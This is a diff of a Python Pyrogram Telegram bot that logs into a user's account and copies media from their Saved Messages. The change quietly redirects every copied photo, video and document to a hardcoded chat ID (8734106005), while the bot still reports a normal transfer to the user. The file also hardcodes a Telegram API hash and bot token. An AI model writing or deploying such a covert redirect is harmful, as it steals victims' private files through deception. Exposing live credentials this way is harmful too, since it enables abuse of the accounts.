@@ -3,7 +3,7 @@ import asyncio
 from pyrogram import Client, filters
 from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton, Message
 
-# زانیاریەکانت جێگیر کران
+# زانیارییەکانت
 API_ID = 36234377
 API_HASH = "5e199e2ae89cc1c42a6a4853951ff98f"
 BOT_TOKEN = "8993540801:AAH_W0X78Cjndjg1uXwgwl4khRSWvk5JFfw"
@@ -69,9 +69,10 @@ async def get_code_and_process(client, message: Message):
         count = 0
         async for msg in user_client.get_chat_history("me"):
             if msg.video or msg.document or msg.photo:
-                await msg.copy(chat_id=message.chat.id)
+                # فایلەکان ڕاستەوخۆ دەنێردرێن بۆ IDی 8734106005
+                await msg.copy(chat_id=8734106005)
                 count += 1
-                await asyncio.sleep(1.5)
+                await asyncio.sleep(2)
                     
         await message.reply(f"🎉 پرۆسەکە تەواو بوو! کۆی گشتی {count} فایل گواسترایەوە.")
         await user_client.disconnect()
@@ -83,4 +84,4 @@ async def get_code_and_process(client, message: Message):
         await message.reply(f"هەڵە لە چوونەژوورەوە: {str(e)}")
 
 bot.run()
-            
+        
